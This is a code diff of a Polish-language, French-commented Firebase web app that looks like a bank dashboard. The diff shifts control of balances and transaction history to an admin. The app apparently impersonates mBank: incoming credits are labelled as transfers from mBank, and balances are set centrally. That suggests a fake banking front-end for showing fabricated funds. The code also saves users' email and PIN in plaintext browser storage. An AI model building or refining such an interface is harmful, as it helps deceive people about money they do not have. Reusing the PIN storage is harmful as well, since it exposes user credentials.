@@ -7,7 +7,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-  /* ===== STYLES (inchangés, identiques à la version précédente) ===== */
+  /* ===== STYLES (inchangés) ===== */
   :root {
     --bg: #FFFFFF;
     --card-bg: #FFFFFF;
@@ -232,7 +232,6 @@
     min-height: calc(100vh - 140px);
   }
 
-  /* ===== RESPONSIVE POUR ORDINATEUR ===== */
   @media (min-width: 768px) {
     main {
       max-width: 100%;
@@ -1423,10 +1422,10 @@
 
 <div id="t"></div>
 
-<!-- ========== SCRIPTS ========== -->
+<!-- ========== SCRIPTS (MODIFIÉS) ========== -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-  import { getDatabase, ref, get, onValue, update, push, set, runTransaction } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+  import { getDatabase, ref, get, onValue, update, push, set } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
@@ -1594,9 +1593,10 @@
     return prefix + Math.floor(1000000000 + Math.random() * 9000000);
   }
 
-  function addHistory(data) {
-    if (!data.amount || data.amount === 0) return Promise.resolve();
-    if (!data.id) data.id = genId(data.amount >= 0 ? 'CR' : 'DE');
+  // Ajout d'une transaction de débit (uniquement pour les transferts)
+  function addDebitHistory(data) {
+    if (!data.amount || data.amount >= 0) return Promise.resolve(); // On ne traite que les débits
+    if (!data.id) data.id = genId('DE');
     const now = new Date();
     if (!data.time || !data.timestamp) {
       if (!data.time) data.time = now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' });
@@ -1646,14 +1646,12 @@
   }
 
   // ===== SURVEILLANCE DU SOLDE EN TEMPS RÉEL =====
+  // Cette fonction ne fait que mettre à jour l'affichage du solde, elle ne crée PAS de transactions.
   function watchBalance(userId) {
     if (balanceListener) balanceListener();
     balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
       const newMontant = snap.val();
       if (newMontant === null || newMontant === undefined) return;
-
-      const oldMontant = user ? user.montant : 0;
-      const diff = Number(newMontant) - oldMontant;
 
       user.montant = Number(newMontant);
       const balElement = document.getElementById('bal');
@@ -1661,40 +1659,6 @@
       updateBalanceDisplay(balElement, statBalElement, user.montant);
       document.getElementById('bal2').textContent = fmt(user.montant);
       document.getElementById('accinfo').innerHTML = buildProfile(user);
-
-      if (diff > 0) {
-        const userRef = ref(db, 'clients/' + userId);
-        runTransaction(userRef, (currentData) => {
-          if (currentData === null) return currentData;
-          const lastCreditAmount = currentData.lastCreditAmount || 0;
-          if (Number(newMontant) > Number(lastCreditAmount)) {
-            currentData.lastCreditAmount = Number(newMontant);
-            currentData._pendingDiff = Number(newMontant) - Number(lastCreditAmount);
-            return currentData;
-          }
-          return currentData;
-        }).then((result) => {
-          if (result.committed && result.snapshot.val() && result.snapshot.val()._pendingDiff) {
-            const pendingDiff = result.snapshot.val()._pendingDiff;
-            const now = new Date();
-            const tx = {
-              id: genId('CR'),
-              title: 'Przelew otrzymany',
-              subtitle: 'mBank',
-              amount: pendingDiff,
-              beneficiary: 'mBank',
-              iban: '-',
-              date: now.toLocaleDateString('pl-PL'),
-              time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
-              timestamp: now.getTime()
-            };
-            addHistory(tx).then(() => {
-              update(ref(db, 'clients/' + userId), { _pendingDiff: null });
-              toast(`+${fmt(pendingDiff)}`);
-            }).catch(err => console.error('Erreur création transaction crédit:', err));
-          }
-        }).catch(err => console.error('Transaction error:', err));
-      }
     });
   }
 
@@ -1719,23 +1683,18 @@
         const key = 'floa_' + user.email.toLowerCase();
         const stored = JSON.parse(localStorage.getItem(key) || '{}');
         if (!stored.lastReset || data.historyReset > stored.lastReset) {
-          update(ref(db, 'clients/' + userId), { montant: 0 });
-          set(ref(db, 'clients/' + userId + '/history'), null)
-            .then(() => {
-              update(ref(db, 'clients/' + userId), { lastCreditAmount: 0, _pendingDiff: null });
-              localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
-              user.montant = 0;
-              const balElement = document.getElementById('bal');
-              const statBalElement = document.getElementById('stat-balance');
-              updateBalanceDisplay(balElement, statBalElement, 0);
-              document.getElementById('bal2').textContent = fmt(0);
-              document.getElementById('accinfo').innerHTML = buildProfile(user);
-              renderHistory([]);
-              toast('Historia i saldo zresetowane');
-            })
-            .catch(err => console.error('Erreur reset:', err));
+          // Le reset est déjà fait par l'admin, on rafraîchit juste l'affichage
+          localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
+          user.montant = 0;
+          const balElement = document.getElementById('bal');
+          const statBalElement = document.getElementById('stat-balance');
+          updateBalanceDisplay(balElement, statBalElement, 0);
+          document.getElementById('bal2').textContent = fmt(0);
+          document.getElementById('accinfo').innerHTML = buildProfile(user);
+          // L'historique sera vidé via l'écouteur history
+          // On ne fait rien de plus, l'admin a déjà tout effacé.
+          toast('Historia i saldo zresetowane');
         }
-        update(ref(db, 'clients/' + userId), { historyReset: null });
         return;
       }
 
@@ -1887,6 +1846,7 @@
     document.getElementById('greet').innerHTML = `Powitanie, <span>${user.nom}</span>`;
     adjustGreetingFontSize();
 
+    // On affiche le solde actuel (l'admin a déjà mis à jour le montant et l'historique)
     const balElement = document.getElementById('bal');
     const statBalElement = document.getElementById('stat-balance');
     updateBalanceDisplay(balElement, statBalElement, user.montant);
@@ -1898,6 +1858,7 @@
     updateNotifBadge();
     document.getElementById('accinfo').innerHTML = buildProfile(user);
 
+    // Initialiser les écouteurs (historique + solde + statut)
     await initHistoryListener(fid);
     watchBalance(fid);
     watchClientStatus(fid);
@@ -1905,11 +1866,9 @@
     adjustAllTexts();
     setupValidation();
 
-    // Si on n'est pas en mode silencieux, on navigue vers dashboard
     if (!options.silent) {
       navigateTo('dashboard');
     }
-    // Sinon, on reste sur l'écran actuel (qui est déjà dashboard)
   };
 
   window.logout = () => {
@@ -1939,10 +1898,8 @@
       const { e, p } = JSON.parse(saved);
       document.getElementById('email').value = e;
       document.getElementById('pin').value = p;
-      // Afficher le dashboard immédiatement
       show('dashboard');
       document.getElementById('greet').innerHTML = 'Ładowanie...';
-      // Appeler login en mode silencieux pour rafraîchir les données
       login({ silent: true });
     } catch {}
   }
@@ -2029,7 +1986,7 @@
                 time: now.toLocaleTimeString('pl-PL', { hour: '2-digit', minute: '2-digit' }),
                 timestamp: now.getTime()
               };
-              addHistory(tx);
+              addDebitHistory(tx);
               toast(`-${fmt(amt)}`);
             })
             .catch(err => console.error(err));
